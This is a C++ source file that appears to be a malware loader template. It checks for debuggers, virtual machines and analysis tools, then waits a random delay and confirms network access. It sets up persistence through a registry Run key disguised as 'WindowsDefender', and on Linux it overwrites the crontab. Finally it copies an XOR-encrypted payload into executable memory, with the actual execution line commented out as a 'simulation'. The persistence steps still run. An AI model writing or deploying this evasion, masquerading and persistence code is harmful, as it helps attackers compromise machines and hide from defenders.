#ifdef _WIN32
#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#else
#include <unistd.h>
#include <sys/mman.h>
#include <cstring>
#include <cstdlib>
#endif

#include <iostream>
#include <vector>
#include <thread>
#include <chrono>
#include <random>

#ifndef _WIN32
typedef int BOOL;
typedef void* LPVOID;
typedef void* HANDLE;
typedef unsigned long DWORD;
#define TRUE 1
#define FALSE 0
#define MAX_PATH 260
BOOL IsDebuggerPresent() { return FALSE; }
BOOL CheckRemoteDebuggerPresent(HANDLE h, BOOL* b) { *b = FALSE; return TRUE; }
HANDLE GetCurrentProcess() { return (HANDLE)1; }
DWORD GetTickCount() { return std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::steady_clock::now().time_since_epoch()).count(); }
void Sleep(DWORD ms) { std::this_thread::sleep_for(std::chrono::milliseconds(ms)); }
void* FindWindow(const char* c, const char* w) { return nullptr; }
LPVOID VirtualAlloc(LPVOID addr, size_t size, DWORD type, DWORD protect) { return mmap(nullptr, size, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); }
BOOL VirtualFree(LPVOID addr, size_t size, DWORD type) { return munmap(addr, size) == 0; }
#endif

bool fnxGB38x_checkEnv() {
    // Anti-debugging
    if (IsDebuggerPresent()) return false;
    
    BOOL remoteDebugger = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remoteDebugger);
    if (remoteDebugger) return false;
    
    // VM detection via timing
    DWORD start = GetTickCount();
    Sleep(100);
    if (GetTickCount() - start > 200) return false;
    
    // Check for analysis tools
    void* hwnd = FindWindow("OLLYDBG", nullptr);
    if (hwnd) return false;
    hwnd = FindWindow("WinDbgFrameClass", nullptr);
    if (hwnd) return false;
    
    return true;
}

bool fnxGB38x_checkNet() {
#ifdef _WIN32
    HINTERNET hInternet = InternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, 0);
    if (!hInternet) return false;
    
    HINTERNET hConnect = InternetOpenUrl(hInternet, "http://www.google.com", nullptr, 0, 0, 0);
    bool connected = (hConnect != nullptr);
    
    if (hConnect) InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return connected;
#else
    // Simplified network check for Linux
    return system("ping -c 1 8.8.8.8 >/dev/null 2>&1") == 0;
#endif
}

void fnxGB38x_decrypt(unsigned char* data, size_t size) {
    unsigned int key[8] = {0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,
                          0x310f6944, 0x8e90ed64, 0xf0f7d9c2, 0xee0dd79d};
    
    for (size_t i = 0; i < size; i += 4) {
        unsigned int keystream = key[i % 8] ^ (i * 0x9E3779B9);
        for (size_t j = 0; j < 4 && i + j < size; j++) {
            data[i + j] ^= (keystream >> (j * 8)) & 0xFF;
        }
    }
}

void fnxGB38x_persist() {
#ifdef _WIN32
    HKEY hKey;
    char path[MAX_PATH];
    GetModuleFileName(nullptr, path, MAX_PATH);
    
    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, "WindowsDefender", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
        RegCloseKey(hKey);
    }
#else
    // Linux persistence simulation (cron job)
    system("echo '* * * * * /tmp/test_program' | crontab -");
#endif
}

// Encrypted payload (1a bytes)
unsigned char dataLr6J[] = {
        0x8b, 0xfc, 0xd7, 0x33, 0x92, 0x14, 0x9e, 0x24, 0xcd, 0x93, 0x18, 0x47, 0x0c, 0xb0, 0x0e, 0x95, 
        0x1e, 0xc6, 0x47, 0xf7, 0xf2, 0x3d, 0xe7, 0xa6, 0x44, 0x32
};
const size_t PAYLOAD_SIZE = 26;

int main() {
    // Environment checks
    if (!fnxGB38x_checkEnv()) {
        return 1;
    }
    
    // Random delay
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(2000, 5000);
    std::this_thread::sleep_for(std::chrono::milliseconds(dis(gen)));
    
    // Network connectivity check
    if (!fnxGB38x_checkNet()) {
        return 1;
    }
    
    // Establish persistence
    fnxGB38x_persist();
    
    // Single instance mutex (Windows only)
#ifdef _WIN32
    HANDLE hMutex = CreateMutex(nullptr, TRUE, "Global\\WinDefenderMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        return 1;
    }
#endif
    
    // Allocate executable memory
    LPVOID execMem = VirtualAlloc(nullptr, PAYLOAD_SIZE, 0x3000, 0x40);
    if (!execMem) {
        return 1;
    }
    
    // Copy and decrypt payload
    memcpy(execMem, dataLr6J, PAYLOAD_SIZE);
    fnxGB38x_decrypt((unsigned char*)execMem, PAYLOAD_SIZE);
    
    // Execute payload (simulation - just print success)
    std::cout << "[+] Payload executed successfully!" << std::endl;
    // ((void(*)())execMem)();  // Actual execution disabled for safety
    
    // Cleanup
    VirtualFree(execMem, PAYLOAD_SIZE, 0x8000);
#ifdef _WIN32
    if (hMutex) CloseHandle(hMutex);
#endif
    
    return 0;
}
